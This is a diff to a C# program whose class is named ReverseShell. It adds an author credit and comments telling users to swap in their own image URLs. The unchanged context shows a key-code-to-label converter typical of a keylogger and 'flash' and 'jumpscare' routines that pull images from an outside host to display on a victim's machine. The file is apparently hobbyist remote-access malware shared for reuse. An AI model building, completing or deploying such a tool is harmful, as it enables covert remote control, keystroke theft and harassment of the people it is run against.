@@ -1,3 +1,6 @@
+// made by daimy
+// there are a couple debugging lines commented out. feel free to uncomment them
+
 using System;
 using System.Diagnostics;
 using System.Drawing; 
@@ -89,7 +92,7 @@ class ReverseShell
         }
     }
 
-    static string ConvertKey(int keyCode)
+    static string ConvertKey(int keyCode) 
     {
         if (keyCode == 160 || keyCode == 161 || keyCode == 162 || keyCode == 163 || keyCode == 164)
         {
@@ -98,7 +101,7 @@ class ReverseShell
 
         switch (keyCode)
         {
-            case 8: return "[BACKSPACE]";
+            case 8: return "[BACKSPACE]"; 
             case 9: return "[TAB]";
             case 13: return "[ENTER]";
             case 27: return "[ESC]";
@@ -139,7 +142,7 @@ class ReverseShell
 
     static void ShowFlash()
     {
-        string imageUrl = "https://cdn.polarisbot.com/flash.jpg";
+        string imageUrl = "https://cdn.polarisbot.com/flash.jpg"; //change this to ur RAW jpg
 
         var form = new Form
         {
@@ -178,7 +181,7 @@ class ReverseShell
 
     static void ShowJumpscare()
     {
-        string imageUrl = "https://cdn.polarisbot.com/jumpscare.jpg";
+        string imageUrl = "https://cdn.polarisbot.com/jumpscare.jpg"; //change this to your RAW jpg
 
         var form = new Form
         {
